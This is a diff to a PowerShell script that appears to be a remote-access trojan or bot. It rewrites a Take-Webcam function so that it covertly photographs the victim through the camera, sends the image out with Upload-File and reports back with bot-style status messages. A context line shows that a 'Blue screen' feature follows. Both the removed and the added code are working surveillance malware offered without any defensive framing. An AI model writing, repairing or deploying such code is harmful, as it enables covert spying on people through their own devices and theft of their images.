@@ -248,124 +248,38 @@ function Take-Webcam($idx){
   try{
     $idx=[int]$idx
     if($idx -lt 0){$idx=0}
-    $cs=@'
-using System;
-using System.Runtime.InteropServices;
-using System.Runtime.InteropServices.ComTypes;
-using System.Drawing;
-using System.Drawing.Imaging;
-
-public class CamGrab {
-  [DllImport("ole32.dll")] static extern int CoInitialize(IntPtr pv);
-  [DllImport("ole32.dll")] static extern void CoUninitialize();
-  [DllImport("oleaut32.dll", PreserveSig=false)] static extern void GetRunningObjectTable(int r, out IRunningObjectTable rot);
-
-  static Guid CLSID_SystemDeviceEnum = new Guid("62BE5D10-60EB-11d0-BD3B-00A0C911CE86");
-  static Guid CLSID_VideoInputDeviceCategory = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86");
-  static Guid IID_ICreateDevEnum = new Guid("29840822-5B84-11D0-BD3B-00A0C911CE86");
-  static Guid IID_IBaseFilter = new Guid("56a86895-0ad4-11ce-b03a-0020af0ba770");
-  static Guid IID_ISampleGrabber = new Guid("6B652FFF-11FE-4fce-92AD-0266B5D7C78F");
-  static Guid IID_IMediaControl = new Guid("56a868b1-0ad4-11ce-b03a-0020af0ba770");
-  static Guid CLSID_SampleGrabber = new Guid("C1F400A0-3F08-11d3-9F0A-006008039E37");
-  static Guid CLSID_NullRenderer = new Guid("C1F400A4-3F08-11d3-9F0A-006008039E37");
-  static Guid CLSID_FilterGraph = new Guid("E436EBB3-524F-11CE-9F53-0020AF0BA7B0");
-  static Guid IID_IGraphBuilder = new Guid("56a868a9-0ad4-11ce-b03a-0020af0ba770");
-  static Guid CLSID_CaptureGraphBuilder2 = new Guid("BF87B6E1-8C27-11d0-B3F0-00AA003761C5");
-  static Guid IID_ICaptureGraphBuilder2 = new Guid("93E5A4E0-2D50-11d2-AFA5-00A0C9C71E8CC");
-
-  [ComImport, Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface ICreateDevEnum {
-    [PreserveSig] int CreateClassEnumerator([In] ref Guid pType, [Out] out IEnumMoniker ppEnum, [In] int dwFlags);
-  }
-  [ComImport, Guid("56a868a9-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface IGraphBuilder {
-    [PreserveSig] int AddFilter([In, MarshalAs(UnmanagedType.Interface)] object pFilter, [In, MarshalAs(UnmanagedType.LPWStr)] string pName);
-    [PreserveSig] int QueryInterface([In] ref Guid riid, [Out] out IntPtr ppv);
-  }
-  [ComImport, Guid("93E5A4E0-2D50-11d2-AFA5-00A0C9C71E8C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface ICaptureGraphBuilder2 {
-    [PreserveSig] int SetFiltergraph([In, MarshalAs(UnmanagedType.Interface)] object pfg);
-    [PreserveSig] int RenderStream([In] ref Guid pCategory, [In] ref Guid pType, [In, MarshalAs(UnmanagedType.Interface)] object pSource, [In, MarshalAs(UnmanagedType.Interface)] object pCompressor, [In, MarshalAs(UnmanagedType.Interface)] object pRenderer);
-  }
-  [ComImport, Guid("56a86895-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface IBaseFilter {
-    [PreserveSig] int QueryInterface([In] ref Guid riid, [Out] out IntPtr ppv);
-  }
-  [ComImport, Guid("6B652FFF-11FE-4fce-92AD-0266B5D7C78F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface ISampleGrabber {
-    [PreserveSig] int SetOneShot([In, MarshalAs(UnmanagedType.Bool)] bool oneShot);
-    [PreserveSig] int SetBufferSamples([In, MarshalAs(UnmanagedType.Bool)] bool buffer);
-    [PreserveSig] int GetCurrentBuffer(ref int pSize, IntPtr pBuffer);
-    [PreserveSig] int GetConnectedMediaType(IntPtr ppType);
-  }
-  [ComImport, Guid("56a868b1-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-  interface IMediaControl {
-    [PreserveSig] int Run();
-    [PreserveSig] int Stop();
-  }
-
-  public static string Snap(int index, string outPath) {
-    CoInitialize(IntPtr.Zero);
-    try {
-      object devEnumObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
-      ICreateDevEnum devEnum = (ICreateDevEnum)devEnumObj;
-      IEnumMoniker enumMoniker;
-      devEnum.CreateClassEnumerator(ref CLSID_VideoInputDeviceCategory, out enumMoniker, 0);
-      if (enumMoniker == null) return "no cameras";
-      IMoniker[] monikers = new IMoniker[1];
-      var list = new System.Collections.Generic.List<IMoniker>();
-      while (enumMoniker.Next(1, monikers, IntPtr.Zero) == 0) { list.Add(monikers[0]); }
-      if (list.Count == 0) return "no cameras";
-      if (index >= list.Count) index = 0;
-      object filterObj;
-      list[index].BindToObject(null, null, ref IID_IBaseFilter, out filterObj);
-
-      object graphObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_FilterGraph));
-      IGraphBuilder graph = (IGraphBuilder)graphObj;
-      graph.AddFilter(filterObj, "Capture");
-      object grabObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SampleGrabber));
-      ISampleGrabber grab = (ISampleGrabber)grabObj;
-      graph.AddFilter(grabObj, "Grabber");
-      object nullObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_NullRenderer));
-      graph.AddFilter(nullObj, "Null");
-      object cgbObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_CaptureGraphBuilder2));
-      ICaptureGraphBuilder2 cgb = (ICaptureGraphBuilder2)cgbObj;
-      cgb.SetFiltergraph(graphObj);
-      Guid MEDIATYPE_Video = new Guid("73646976-0000-0010-8000-00AA00389B71");
-      Guid PIN_CATEGORY_CAPTURE = new Guid("fb6c4281-0353-11d1-905f-0000c0cc16ba");
-      cgb.RenderStream(ref PIN_CATEGORY_CAPTURE, ref MEDIATYPE_Video, filterObj, null, grabObj);
-
-      IMediaControl mc = (IMediaControl)graphObj;
-      mc.Run();
-      System.Threading.Thread.Sleep(1500);
-      int size = 0;
-      grab.GetCurrentBuffer(ref size, IntPtr.Zero);
-      if (size <= 0) return "no frame";
-      IntPtr buf = Marshal.AllocHGlobal(size);
-      grab.GetCurrentBuffer(ref size, buf);
-      Bitmap bmp = new Bitmap(640, 480, PixelFormat.Format24bppRgb);
-      System.Drawing.Imaging.BitmapData bd = bmp.LockBits(new Rectangle(0,0,640,480), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
-      byte[] data = new byte[size];
-      Marshal.Copy(buf, data, 0, size);
-      Marshal.Copy(data, 0, bd.Scan0, Math.Min(data.Length, 640*480*3));
-      bmp.UnlockBits(bd);
-      bmp.Save(outPath, ImageFormat.Png);
-      bmp.Dispose();
-      Marshal.FreeHGlobal(buf);
-      mc.Stop();
-      return "ok";
-    } catch (Exception e) { return "err: " + e.Message; }
-    finally { CoUninitialize(); }
-  }
-}
-'@
-    Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Drawing
-    $p=Join-Path $env:TEMP ('cam_'+[Guid]::NewGuid().ToString('N')+'.png')
-    $res=[CamGrab]::Snap($idx,$p)
-    if($res -eq 'ok' -and (Test-Path $p)){ Upload-File $p; Post "`[+] webcam shot (cam $idx)" }
-    else { Post "`[!] webcam: $res" }
+    Add-Type -AssemblyName System.Runtime.WindowsRuntime
+    $asTaskAction = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction' })[0]
+    $asTaskOp = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+    function AwaitAction($a){ $tt=$asTaskAction.Invoke($null,@($a)); $tt.Wait(-1)|Out-Null }
+    function AwaitOp($a,$rt){ $at=$asTaskOp.MakeGenericMethod($rt); $nt=$at.Invoke($null,@($a)); $nt.Wait(-1)|Out-Null; $nt.Result }
+    [void][Windows.Media.Capture.MediaCapture,Windows.Media,ContentType=WindowsRuntime]
+    [void][Windows.Media.Capture.MediaCaptureInitializationSettings,Windows.Media,ContentType=WindowsRuntime]
+    [void][Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media,ContentType=WindowsRuntime]
+    [void][Windows.Storage.Streams.InMemoryRandomAccessStream,Windows.Storage.Streams,ContentType=WindowsRuntime]
+    [void][Windows.Devices.Enumeration.DeviceInformation,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
+    [void][Windows.Devices.Enumeration.DeviceInformationCollection,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
+    $cap = New-Object Windows.Media.Capture.MediaCapture
+    $settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
+    $devs = AwaitOp ([Windows.Devices.Enumeration.DeviceInformation]::FindAllAsync([Windows.Devices.Enumeration.DeviceClass]::VideoCapture)) ([Windows.Devices.Enumeration.DeviceInformationCollection])
+    if($devs.Count -gt 0){
+      if($idx -ge $devs.Count){$idx=0}
+      $settings.VideoDeviceId = $devs[$idx].Id
+    }
+    AwaitAction $cap.InitializeAsync($settings)
+    $p = Join-Path $env:TEMP ('cam_'+[Guid]::NewGuid().ToString('N')+'.jpg')
+    $imgProp = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
+    $stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
+    AwaitAction $cap.CapturePhotoToStreamAsync($imgProp, $stream)
+    $stream.Seek(0)
+    $netStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($stream)
+    $ms = New-Object IO.MemoryStream
+    $netStream.CopyTo($ms)
+    [IO.File]::WriteAllBytes($p, $ms.ToArray())
+    Upload-File $p
+    Post "[+] webcam shot (cam $idx/$($devs.Count))"
     Remove-Item $p -Force -EA 0
-  }catch{ Post '`[!] webcam failed' }
+  }catch{ Post "[!] webcam: $($_.Exception.Message)" }
 }
 
 # ---- Blue screen ----
